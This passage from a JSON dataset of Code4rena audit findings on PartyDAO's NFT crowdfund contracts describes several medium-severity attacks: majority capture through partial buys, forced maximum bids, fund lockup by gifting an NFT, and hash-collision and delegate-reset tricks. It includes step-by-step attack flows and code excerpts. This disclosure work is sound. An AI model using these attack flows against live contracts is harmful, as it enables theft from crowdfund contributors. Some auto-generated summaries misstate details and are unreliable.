      "content": "_Submitted by Trust, also found by cccz and rvierdiiev_\n\nVoting power is distributed to crowdfund contributors according to the amount contributed divided by NFT purchase price. Attacker can call the `buy()` function of BuyCrowdfund / CollectionBuyCrowdfund, and use only the first X amount of contribution from the crowdfund, such that attacker's contribution > X/2. He will pass his contract to the buy call, which will receive X and will need to add some additional funds, to purchase the NFT. If the purchase is successful, attacker will have majority rule in the created party. If the party does not do anything malicious, this is a losing move for attacker, because the funds they added on top of X to compensate for the NFT price will eventually be split between group members. However, with majority rule there are various different exploitation vectors attacker may use to steal the NFT from the party ( detailed in separate reports). Because it is accepted that single actor majority is dangerous, but without additional vulnerabilities attacker cannot take ownership of the party's assets, I classify this as a Medium. The point is that users were not aware they could become minority under this attack flow.\n\n### Impact\n\nEarly contributor can always become majority of crowdfund leading to rugging risks.\n\n### Proof of Concept\n\n1.  Victim A opens BuyCrowdfund and deposits 20 ETH\n\n2.  Attacker deposits 30 ETH\n\n3.  Victim B deposits 50 ETH\n\n4.  Suppose NFT costs 100 ETH\n\n5.  Attacker will call `buy()`, requesting 59ETH buy price. His contract will add 41 additional ETH and buy the NFT.\n\n6.  Voting power distributed will be: 20 / 59 for Victim A, 30 / 59 for Attacker, 9 / 59 for Victim B. Attacker has majority.\n\n7.  User can use some majority attack to take control of the NFT, netting 100 (NFT value) - 41 (external contribution) - 30 (own contribution) = 29 ETH\n\n\n### Recommended Mitigation Steps\n\nAdd a Crowdfund property called minimumPrice, which will be visible to all. `Buy()` function should not accept NFT price < minimumPrice. Users now have assurances that are not susceptible to majority rule if they deposited enough ETH below the minimumPrice.\n\n**[merklejerk (PartyDAO) acknowledged and commented](https://github.com/code-423n4/2022-09-party-findings/issues/284#issuecomment-1256420138):**\n > We want to avoid requiring a minimum price for now as it's difficult to choose a value that would allow a crowdfund to respond to price drops as well as price increases. Instead we're opting to harden defenses against majority attacks, which would minimize the desirability of this vector, and we're introducing optional host-only and gatekeeper restrictions on `buy()/bid()` functions. We will keep an eye out for this behavior and reassess if it comes up.\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-09-party-findings/issues/284#issuecomment-1268507970):**\n > Gifting can lead to incorrect voting power distribution. Agree with Medium risk.\n\n**[0xble (PartyDAO) confirmed and resolved](https://github.com/code-423n4/2022-09-party-findings/issues/284#issuecomment-1276602578):**\n > Mitigated by: https://github.com/PartyDAO/partybidV2/pull/140\n\n\n\n***\n\n",
      "summary": "\nA vulnerability has been identified in the BuyCrowdfundBase.sol code, which affects the PartyDAO platform. The issue is that when a user calls the buy() function of BuyCrowdfund / CollectionBuyCrowdfund, they can use only the first X amount of contribution from the crowdfund, such that the user's contribution is greater than X/2. This will result in the user having majority rule in the created party. With majority rule, the user can exploit various different exploitation vectors to steal the NFT from the party. This is classified as a medium vulnerability as users may not be aware they could become minority under this attack flow. \n\nThe recommended mitigation steps to address this vulnerability include adding a Crowdfund property called minimumPrice, which will be visible to all. The buy() function should not accept NFT prices lower than the minimumPrice. This will ensure that users have assurances that they are not susceptible to majority rule if they deposited enough ETH below the minimumPrice. The vulnerability was identified through manual audit.",
      "quality_score": 4,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2022-09-party",
      "github_link": "https://github.com/code-423n4/2022-09-party-findings/issues/284",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "cccz  rvierdiiev",
        "Trust"
      ]
    },
    {
      "id": "3315",
      "title": "[M-07] Attacker can force AuctionCrowdfunds to bid their entire contribution up to maxBid",
      "impact": "MEDIUM",
      "content": "_Submitted by Trust, also found by cccz_\n\nAuctionCrowdfund's `bid()` allows any user to compete on an auction on the party's behalf. The code in `bid()` forbids placing a bid if party is already winning the auction:\n\n    if (market.getCurrentHighestBidder(auctionId_) == address(this)) {\n                revert AlreadyHighestBidderError();\n            }\n\nHowever, it does not account for attackers placing bids from their own wallet, and then immediately overbidding them using the party's funds. This can be used in two ways:\n\n1.  Attacker which lists an NFT, can force the party to spend all its funds up to maxBid on the auction, even if the party could have purchased the NFT for much less.\n2.  Attackers can grief random auctions, making them pay the absolute maximum for the item. Attackers can use this to drive the prices of NFT items up, profiting from this using secondary markets.\n\n### Impact\n\nParties can be stopped from buying items at a good value without any risk to the attacker.\n\n### Proof of Concept\n\n1.  Attacker places an NFT for sale, valued at X\n2.  Attacker creates an AuctionCrowdfund, with maxBid = Y such that Y = 2X\n3.  Current bid for the NFT is X - AUCTION_STEP\n4.  Users contribute to the fund, which now has 1.5X\n5.  Users call `bid()` to bid X  for the NFT\n6.  Attacker bids for the item externally for 1.5X - AUCTION_STEP\n7.  Attacker calls `bid()` to bid 1.5X for the NFT\n8.  Attacker sells his NFT for 1.5X although no one apart from the party was interested in buying it above price X\n\n### Recommended Mitigation Steps\n\nIntroduce a new option variable to AuctionCrowdfunds called speedBump. Inside the `bid()` function, calculate seconds since last bid, multiplied by the price change factor. This product must be smaller than the chosen speedBump. Using this scheme, the protocol would have resistance to sudden bid spikes. Optionally, allow a majority funder to override the speed bump.\n\n**[merklejerk (PartyDAO) acknowledged and commented](https://github.com/code-423n4/2022-09-party-findings/issues/220#issuecomment-1254406481):**\n > This is a known limitation of crowdfunds. We will allow some parties to restrict who can call `buy()` or `bid()` to hosts, which will mitigate this.\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-09-party-findings/issues/220#issuecomment-1267209362):**\n > This is a fair concern, a form of potentially leaking value so agree with Medium risk. Not sure I agree with the recommendation here, but restricting to hosts does help mitigate by putting risk on the attacker.\n\n**[0xble (PartyDAO) confirmed and resolved](https://github.com/code-423n4/2022-09-party-findings/issues/220#issuecomment-1276604774):**\n > Mitigated by: https://github.com/PartyDAO/partybidV2/pull/140\n\n\n\n***\n\n",
      "summary": "\nA bug has been identified in the code of AuctionCrowdfund's bid() function, which allows any user to compete on an auction on the party's behalf. Attackers can exploit this by placing bids from their own wallet, and then immediately overbidding them using the party's funds. This can be used to either force the party to spend all its funds up to maxBid on the auction, or to drive the prices of NFT items up, profiting from this using secondary markets.\n\nA proof of concept has been provided to demonstrate how the bug can be exploited. It involves the attacker placing an NFT for sale, valued at X, creating an AuctionCrowdfund with maxBid = Y such that Y = 2X, and then bidding for the NFT externally for 1.5X - AUCTION_STEP and then calling bid() to bid 1.5X for the NFT.\n\nTo mitigate this bug, it is recommended to introduce a new option variable to AuctionCrowdfunds called speedBump. This would calculate seconds since last bid, multiplied by the price change factor, and this product must be smaller than the chosen speedBump. Optionally, allow a majority funder to override the speed bump.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2022-09-party",
      "github_link": "https://github.com/code-423n4/2022-09-party-findings/issues/220",
      "tags": [
        "Business Logic",
        "Auction"
      ],
      "finders": [
        "cccz",
        "Trust"
      ]
    },
    {
      "id": "3314",
      "title": "[M-06] AuctionCrowdfund: If the contract was bid on before the NFT was gifted to the contract, lastBid will not be totalContributions",
      "impact": "MEDIUM",
      "content": "_Submitted by cccz_\n\nIn the finalize function of the AuctionCrowdfund contract, when the contract gets NFT and lastBid\\_ == 0, it is considered that NFT is gifted to the contract and everyone who contributed wins.\n\n            if (nftContract.safeOwnerOf(nftTokenId) == address(this)) {\n                if (lastBid_ == 0) {\n                    // The NFT was gifted to us. Everyone who contributed wins.\n                    lastBid_ = totalContributions;\n\nBut if the contract was bid before the NFT was gifted to the contract, then since lastBid\\_ ! = 0, only the user who contributed at the beginning will win.\n\n### Proof of Concept\n\n<https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/AuctionCrowdfund.sol#L233-L242>\n\n<https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/AuctionCrowdfund.sol#L149-L175>\n\n### Recommended Mitigation Steps\n\nWhether or not NFT is free to get should be determined using whether the contract balance is greater than totalContributions.\n\n**[merklejerk (PartyDAO) confirmed and commented](https://github.com/code-423n4/2022-09-party-findings/issues/147#issuecomment-1254403120):**\n > Gifted NFTs are expected to be an extremely exceptional (if ever) case, but we do want to make a best effort to make these situations somewhat fair to contributors.  We will implement the recommendation and check that `this.balance >= totalContributions` to see if the NFT was acquired for free.\n\n**[0xble (PartyDAO) resolved](https://github.com/code-423n4/2022-09-party-findings/issues/147#issuecomment-1264678161):**\n > Resolved: https://github.com/PartyDAO/partybidV2/pull/133\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-09-party-findings/issues/147#issuecomment-1267170378):**\n > This could be seen as a form of leaking value, agree with Medium risk.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the AuctionCrowdfund contract. This vulnerability can lead to a situation where only the user who contributed at the beginning will win, even if the contract was bid before the NFT was gifted to the contract. This is because the lastBid_ variable is not set to 0 when the NFT is gifted to the contract.\n\nProof of concept and lines of code are provided in the report. No tools were used to identify the vulnerability.\n\nThe recommended mitigation step is to determine whether the contract balance is greater than totalContributions to determine if the NFT is free to get.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2022-09-party",
      "github_link": "https://github.com/code-423n4/2022-09-party-findings/issues/147",
      "tags": [],
      "finders": [
        "cccz"
      ]
    },
    {
      "id": "3313",
      "title": "[M-05] The settledPrice maybe exceed maximumPrice",
      "impact": "MEDIUM",
      "content": "_Submitted by bin2chen_\n\n`BuyCrowdfundBase.sol \\_buy()`\nWhen callValue = 0 is settledPrice to totalContributions ignoring whether totalContributions > maximumPrice\nresulting in the minimum proportion of participants expected to become smaller\n\n### Proof of Concept\n\n        function _buy(\n            IERC721 token,\n            uint256 tokenId,\n            address payable callTarget,\n            uint96 callValue,\n            bytes calldata callData,\n            FixedGovernanceOpts memory governanceOpts\n        )\n        ...\n                settledPrice_ = callValue == 0 ? totalContributions : callValue;  //**** not check totalContributions>maximumPrice****//\n                if (settledPrice_ == 0) {\n                    // Still zero, which means no contributions.\n                    revert NoContributionsError();\n                }\n                settledPrice = settledPrice_;    \n\n(AuctionCrowdfund.sol finalize()  similar)\n\n### Recommended Mitigation Steps\n\nadd check\n\n        function _buy(\n            IERC721 token,\n            uint256 tokenId,\n            address payable callTarget,\n            uint96 callValue,\n            bytes calldata callData,\n            FixedGovernanceOpts memory governanceOpts\n        )\n        ...\n                settledPrice_ = callValue == 0 ? totalContributions : callValue;\n                if (settledPrice_ == 0) {\n                    // Still zero, which means no contributions.\n                    revert NoContributionsError();\n                }\n\n    +++         if (maximumPrice_ != 0 && settledPrice_ > maximumPrice_) {\n    +++                settledPrice_ = maximumPrice_;\n    +++         }\n\n                settledPrice = settledPrice_;    \n\n**[merklejerk (PartyDAO) confirmed and commented](https://github.com/code-423n4/2022-09-party-findings/issues/201#issuecomment-1255183114):**\n > We will cap the callValue to maximumPrice.\n\n**[0xble (PartyDAO) resolved](https://github.com/code-423n4/2022-09-party-findings/issues/201#issuecomment-1264678963):**\n > Resolved: https://github.com/PartyDAO/partybidV2/pull/133\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-09-party-findings/issues/201#issuecomment-1266706257):**\n > This is a potential violation of user expectations - agree with Medium risk.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the BuyCrowdfundBase.sol and AuctionCrowdfund.sol contracts. When the callValue is set to 0, the settledPrice is set to totalContributions, regardless of whether the totalContributions is greater than the maximumPrice. This could result in the minimum proportion of participants expected to become smaller. \n\nThe recommended mitigation step is to add a check to the contracts. This check would ensure that if the maximumPrice is not 0 and the settledPrice is greater than the maximumPrice, the settledPrice is set to the maximumPrice.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2022-09-party",
      "github_link": "https://github.com/code-423n4/2022-09-party-findings/issues/201",
      "tags": [],
      "finders": [
        "bin2chen"
      ]
    },
    {
      "id": "3312",
      "title": "[M-04] NFT Owner can stuck Crowdfund user funds",
      "impact": "MEDIUM",
      "content": "_Submitted by csanuragjain_\n\nConsider a scenario where few users contributed in auction but no one has placed any bid due to reason like NFT price crash etc. So there was 0 bid, the NFT owner could seize the crowdfund users fund until they pay a ransom amount as shown below.\n\n### Proof of Concept\n\n1.  NFT N auction is going on\n2.  CrowdFund users have contributed 100 amount for this auction\n3.  Bidding has not been done yet\n4.  A news came for this NFT owner which leads to crashing of this NFT price\n5.  CrowdFund users are happy that they have not bided and are just waiting for auction to complete so that they can get there refund\n6.  NFT owner realizing this blackmails the CrowdFund users to send him amount 50 or else he would send this worthless NFT to the Crowdfund Auction contract basically stucking all crowdfund users fund. CrowdFund users ignore this and simply wait for auction to end\n7.  Once auction completes [finalize function](https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/crowdfund/AuctionCrowdfund.sol#L196) is called\n\n<!---->\n\n    function finalize(FixedGovernanceOpts memory governanceOpts)\n            external\n            onlyDelegateCall\n            returns (Party party_)\n        {\n    ...\n     if (nftContract.safeOwnerOf(nftTokenId) == address(this)) {\n                if (lastBid_ == 0) {\n                    // The NFT was gifted to us. Everyone who contributed wins.\n                    lastBid_ = totalContributions;\n                    if (lastBid_ == 0) {\n                        // Nobody ever contributed. The NFT is effectively burned.\n                        revert NoContributionsError();\n                    }\n                    lastBid = lastBid_;\n                }\n                // Create a governance party around the NFT.\n                party_ = _createParty(\n                    _getPartyFactory(),\n                    governanceOpts,\n                    nftContract,\n                    nftTokenId\n                );\n                emit Won(lastBid_, party_);\n            } \n    ...\n    }\n\n8. Before calling finalize the lastBid was 0 since no one has bid on this auction but lets see what happens on calling finalize\n\n9. Since NFT owner has transferred NFT to this contract so below statement holds true and `lastBid\\_` is also 0 since no one has bidded\n\n<!---->\n\n    if (lastBid_ == 0) {\n                    lastBid_ = totalContributions;\n\n10. This means now `lastBid\\_` is changed to totalContributions which is 100 so crowdfund users funds will not be refunded and they will end up with non needed NFT.\n\n### Recommended Mitigation Steps\n\nRemove the line `lastBid\\_ = totalContributions;` and let it be the last bid amount which crowdfund users actually bided with.\n\n**[merklejerk (PartyDAO) disputed and commented](https://github.com/code-423n4/2022-09-party-findings/issues/197#issuecomment-1254404973):**\n > This is working as designed. Contributors to a crowdfund essentially enter an agreement to pay up to a maximum price of their combined contributions for an NFT.\n\n**[csanuragjain (warden) commented](https://github.com/code-423n4/2022-09-party-findings/issues/197#issuecomment-1257223437):**\n > @merklejerk But in this case it is not \"up to a maximum price\" but rather always the maximum price using the PoC.\n\n**[merklejerk (PartyDAO) confirmed and commented](https://github.com/code-423n4/2022-09-party-findings/issues/197#issuecomment-1257279270):**\n> Hmm. I reread the PoC and now I'm converting this to confirmed. The real issue here is not so much that the party is paying maximum price, but that the party did not ever bid on the item but also paid maximum price. :facepalm: \n\n**[merklejerk (PartyDAO) disagreed with severity and commented](https://github.com/code-423n4/2022-09-party-findings/issues/197#issuecomment-1257281234):**\n > Still disagree with severity since this is unlikely to happen with a legitimate collection. It should be Medium at most.\n\n**[HardlyDifficult (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-09-party-findings/issues/197#issuecomment-1263529444):**\n > Agree with Medium risk here. This could be a violation of party user expectations since auctions generally target the min possible bid - a form of leaking value.\n\n**[0xble (PartyDAO) resolved](https://github.com/code-423n4/2022-09-party-findings/issues/197#issuecomment-1264679164):**\n > Resolved: https://github.com/PartyDAO/partybidV2/pull/133\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an auction crowdfund smart contract vulnerability. The vulnerability allows the NFT owner to seize the funds of the crowdfund users if no one has placed a bid. This is done by transferring a worthless NFT to the crowdfund auction contract, which triggers the finalize function and changes the lastBid_ to the totalContributions, meaning the crowdfund users funds will not be refunded and they will end up with a non needed NFT. \n\nThe recommended mitigation step for this vulnerability is to remove the line lastBid_ = totalContributions; and let it be the last bid amount which crowdfund users actually bided with. This will ensure that the crowdfund users will be refunded their funds if no one has placed a bid.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2022-09-party",
      "github_link": "https://github.com/code-423n4/2022-09-party-findings/issues/197",
      "tags": [],
      "finders": [
        "csanuragjain"
      ]
    },
    {
      "id": "3311",
      "title": "[M-03] Only part of keccak256() is used as hash, making it susceptible to collision attacks",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/Crowdfund.sol#L275\nhttps://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/Crowdfund.sol#L325\nhttps://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/distribution/TokenDistributor.sol#L26\n\n\n## Vulnerability details\n\n\n\nAt 2 places in the code only part of the output of `keccak256()` is used as the hash:\n* At `TokenDistributor` - `DistributionState.distributionHash15` - uses only a 15 bytes as a hash\n    * This one is intended to save storage\n* At `Crowdfund.governanceOptsHash` a 16 bytes is used as hash\n    * This one has no benefit at all as it doesn't save on storage\n\n\n15/16 bytes hash is already not very high to begin with (as explained below). On top of that, using a non standard hash can be unsafe. Since diverging from the standard can break things.\n\n\n\n## Impact\n\n\nFor the `FixedGovernanceOpts` an attacker can create a legitimate party, and then when running `buy()` use the malicious hash to:\n* include himself in the hosts (DoS-ing the party by vetoing every vote)\n* reduce the `passThresholdBps` (allowing him to pass any vote, including sending funds from the Party)\n* Setting himself as `feeRecipient` and increasing the fee\n\n\nFor the `DistributionInfo` struct - an attacker can easily drain all funds from the token distribution contract, by using the legitimate hash to create a distribution with a malicious ERC20 token (and a malicious party contract), and then using the malicious hash to claim assets of a legitimate token.\n\n## Proof of Concept\n\n### The attack\n\n\nUsing the birthday attack, for a 50% chance with a 15 bytes hash, the number of hashes needed to generate is 1.4e18 (`(ln(1/0.5) *2) ** 0.5 * (2 ** 60)`).\n* For 16 bytes that would be 2.2e19\n\nAn attacker can create 2 different structs, a legitimate and a malicious one, while modifying at each iteration only the last bits\n* For the `FixedGovernanceOpts` the last bits would be the `feeRecipient` field\n* For the `DistributionInfo` struct that would be the `fee` field (and then exploit it via the `claim()` function which doesn't validate the `fee` field)\n\nThe attacker will than generate half of the hashes from the malicious one, and half from the legitimate ones, so in case of a collision there's a 50% chance it'd be between the legitimate and malicious struct.\n\n\n\n### CPU\n\n* In the `DistributionInfo` we have 224 bytes (and for `FixedGovernanceOpts` 192 bytes if we precalculate the hosts hash)\n* A computer needs about 11 cycles per byte\n* An avg home PC can do ~3e9 cycles per seconds\n* There are ~8.6e4 seconds a day\n* Putting it all together `1.4e18 * 11 * 224 / (3e9*8.6e4)` = ~1.3e8\n\n* Note that we can further optimize it (by 10 times at least), since we're using the same input and only modifying the last bits every time (the `fee` field)\n\n### Storage\n32 * 1.4e18 = ~4.5e19 bytes is needed, while an affordable drive can be 8TB=~8e12 bytes.\nThat puts it about 5e6 times away from and affordable attack.\n\n\n### Overall Risk\nThe calculations above are for basic equipment, an attacker can be spending more on equipment to get closer (I'd say you can easily multiply that by 100 for a medium size attacker + running the computations for more than one day)\nCombining that with the fact that a non-standard hash is used, and that in general hashes can have small vulnerabilities that lower a bit their strength - I'd argue it's not very safe to be ~1e4 (for a medium size attacker; ~1.5e5 for 16 bytes) away from a practical attack.\n\n\n\n## Recommended Mitigation Steps\nUse the standard, 32-bytes, output of `keccak256()`",
      "summary": "\nThis bug report is about two places in the code that only use part of the output of the keccak256() function as a hash. This is a problem because using a non-standard hash can be unsafe and can lead to vulnerabilities. For example, an attacker could use the malicious hash to include themselves in the hosts of a party, reduce the pass threshold, or set themselves as the fee recipient. Additionally, an attacker could use the legitimate hash to create a malicious distribution and then use the malicious hash to claim assets of a legitimate token.\n\nUsing the birthday attack, it is estimated that a computer needs about 1.3e8 days to generate enough hashes to have a 50% chance of a collision. This is too costly to be practical for a small attacker, but a medium size attacker could be able to do it.\n\nThe recommended mitigation step is to use the standard, 32-bytes, output of the keccak256() function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2022-09-party",
      "github_link": "https://github.com/code-423n4/2022-09-party-findings/issues/231",
      "tags": [],
      "finders": [
        "Lambda  V\\B_",
        "0xA5DF"
      ]
    },
    {
      "id": "3310",
      "title": "[M-02] Previously nominated delegate can reset the delegation",
      "impact": "MEDIUM",
      "content": "_Submitted by hyh_\n\n`burn()` allows for previously recorded delegate to set himself to be contributor's delegate even if another one was already chosen.\n\nThis can be quite material as owner choice for the whole voting power is being reset this way to favor the old delegate.\n\n### Proof of Concept\n\n`\\_burn()` can be invoked by anyone on the behalf of any `contributor`:\n\n<https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/Crowdfund.sol#L167-L171>\n\n```solidity\n    function burn(address payable contributor)\n        public\n    {\n        return _burn(contributor, getCrowdfundLifecycle(), party);\n    }\n```\n\nIt mints the governance NFT for the contributor whenever he has voting power:\n\n<https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/Crowdfund.sol#L471-L485>\n\n```solidity\n        if (votingPower > 0) {\n            // Get the address to delegate voting power to. If null, delegate to self.\n            address delegate = delegationsByContributor[contributor];\n            if (delegate == address(0)) {\n                // Delegate can be unset for the split recipient if they never\n                // contribute. Self-delegate if this occurs.\n                delegate = contributor;\n            }\n            // Mint governance NFT for the contributor.\n            party_.mint(\n                contributor,\n                votingPower,\n                delegate\n            );\n        }\n```\n\nNow `mint()` calls `\\_adjustVotingPower()` with a new delegate, redirecting all the intristic power, not just one for that id, ignoring the delegation the `owner` might already have:\n\n<https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/party/PartyGovernanceNFT.sol#L120-L133>\n\n```solidity\n    function mint(\n        address owner,\n        uint256 votingPower,\n        address delegate\n    )\n        external\n        onlyMinter\n        onlyDelegateCall\n    {\n        uint256 tokenId = ++tokenCount;\n        votingPowerByTokenId[tokenId] = votingPower;\n        _adjustVotingPower(owner, votingPower.safeCastUint256ToInt192(), delegate);\n        _mint(owner, tokenId);\n    }\n```\n\nI.e. Bob the contributor can take part in the crowdfunding with `contribute()` with small `0.01 ETH` stake, stating Mike as the delegate of his choice with `contribute(Mike, ...)`:\n\n<https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/Crowdfund.sol#L189-L208>\n\n```solidity\n    /// @param delegate The address to delegate to for the governance phase.\n    /// @param gateData Data to pass to the gatekeeper to prove eligibility.\n    function contribute(address delegate, bytes memory gateData)\n        public\n        payable\n    {\n        _contribute(\n            msg.sender,\n            msg.value.safeCastUint256ToUint96(),\n            delegate,\n            // We cannot use `address(this).balance - msg.value` as the previous\n            // total contributions in case someone forces (suicides) ETH into this\n            // contract. This wouldn't be such a big deal for open crowdfunds\n            // but private ones (protected by a gatekeeper) could be griefed\n            // because it would ultimately result in governance power that\n            // is unattributed/unclaimable, meaning that party will never be\n            // able to reach 100% consensus.\n            totalContributions,\n            gateData\n        );\n```\n\nThen crowdfund was a success, party was created, and Melany, who also participated, per off-chain arrangement has transferred to Bob a `tokenId` with big voting power (say it is `100 ETH` and the majority of voting power):\n\n<https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/party/PartyGovernanceNFT.sol#L146-L155>\n\n```solidity\n    /// @inheritdoc ERC721\n    function safeTransferFrom(address owner, address to, uint256 tokenId)\n        public\n        override\n        onlyDelegateCall\n    {\n        // Transfer voting along with token.\n        _transferVotingPower(owner, to, votingPowerByTokenId[tokenId]);\n        super.safeTransferFrom(owner, to, tokenId);\n    }\n```\n\n<https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/party/PartyGovernance.sol#L879-L887>\n\n```solidity\n    // Transfers some voting power of `from` to `to`. The total voting power of\n    // their respective delegates will be updated as well.\n    function _transferVotingPower(address from, address to, uint256 power)\n        internal\n    {\n        int192 powerI192 = power.safeCastUint256ToInt192();\n        _adjustVotingPower(from, -powerI192, address(0));\n        _adjustVotingPower(to, powerI192, address(0));\n    }\n```\n\nBob don't care about his early small contribution and focuses on managing the one that Melany transferred instead as he simply doesn't need the voting power from the initial `0.01 ETH` contribution anymore.\n\nThe actual delegate for Bob at the moment is Linda, while his business with Mike is over. So Bob sets her address there, calling `delegateVotingPower(Linda)`:\n\n<https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/party/PartyGovernance.sol#L448-L454>\n\n```solidity\n    /// @notice Pledge your intrinsic voting power to a new delegate, removing it from\n    ///         the old one (if any).\n    /// @param delegate The address to delegating voting power to.\n    function delegateVotingPower(address delegate) external onlyDelegateCall {\n        _adjustVotingPower(msg.sender, 0, delegate);\n        emit VotingPowerDelegated(msg.sender, delegate);\n    }\n```\n\nNow, Mike can unilaterally delegate to himself the whole voting power with `burn(Bob)` as mint() just resets the delegation with the previously recorded value with `_adjustVotingPower(owner, votingPower.safeCastUint256ToInt192(), delegate)`.\n\n### Recommended Mitigation Steps\n\nThe issue is that `mint()` always assumes that it is the first operation for the `owner`, which might not always be the case.\n\nConsider not changing the delegate on `mint` if one is set already:\n\n<https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/party/PartyGovernanceNFT.sol#L120-L133>\n\n```solidity\n    function mint(\n        address owner,\n        uint256 votingPower,\n        address delegate\n    )\n        external\n        onlyMinter\n        onlyDelegateCall\n    {\n        uint256 tokenId = ++tokenCount;\n        votingPowerByTokenId[tokenId] = votingPower;\n+       address actualDelegate = <get_current_delegate>;\n+       if (actualDelegate == address(0)) actualDelegate = delegate;\n-       _adjustVotingPower(owner, votingPower.safeCastUint256ToInt192(), delegate);\n+       _adjustVotingPower(owner, votingPower.safeCastUint256ToInt192(), actualDelegate);\n        _mint(owner, tokenId);\n    }\n```\n\nMore complicated version might be the one with tracking the most recent request via `contribute()/delegateVotingPower()` calls timestamps. Here we assume that the `delegateVotingPower()` holds more information as in the majority of practical cases it occurs after initial `contribute()` and it is a direct voluntary call from the owner.\n\n**[merklejerk (PartyDAO) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2022-09-party-findings/issues/361#issuecomment-1255353936):**\n > Unusual and interesting, but we think this should be Medium risk since the setup is somewhat exotic and still not a guarantee that assets would be at risk. We will implement the fix suggested.\n\n**[HardlyDifficult (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-09-party-findings/issues/361#issuecomment-1262817269):**\n > Agree with downgrading to Medium risk. This scenario can result in redirecting voting power to the wrong account, but is a nuanced scenario that would be difficult to target as an attack.\n\n**[0xble (PartyDAO) resolved](https://github.com/code-423n4/2022-09-party-findings/issues/361#issuecomment-1264679379):**\n > Resolved: https://github.com/PartyDAO/partybidV2/pull/134\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the PartyDAO's Crowdfund.sol contract. This vulnerability allows for previously recorded delegates to set themselves to be contributors' delegates even if another one was already chosen. This can be quite material as the owner choice for the whole voting power is being reset this way to favor the old delegate. \n\nThe vulnerability occurs because of the mint() function, which calls _adjustVotingPower() with a new delegate, redirecting all the intrinsic power, not just one for that ID, ignoring the delegation the owner might already have. The mint() function is called whenever a contributor contributes to the crowdfund, and they can set a delegate of their choice with the contribute() function. \n\nThe vulnerability can be exploited when a contributor transfers a tokenId with big voting power to another party, and the other party calls the delegateVotingPower() function with a new delegate. This allows the previous delegate to call burn() on behalf of the contributor, setting themselves as the delegate of the contributor, and thus resetting the owner's choice of delegate. \n\nThe recommended mitigation steps are to consider not changing the delegate on mint() if one is set already, and to track the most recent request via contribute()/delegateVotingPower() calls timestamps. This will ensure that the delegate set by the owner is not changed, and that the vulnerability cannot be exploited.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2022-09-party",
      "github_link": "https://github.com/code-423n4/2022-09-party-findings/issues/361",
      "tags": [],
      "finders": [
        "hyh"
      ]
    },
    {
      "id": "3309",
      "title": "[M-01] Attacker can list an NFT they own and inflate to zero all users’ contributions, keeping the NFT and all the money",
      "impact": "MEDIUM",
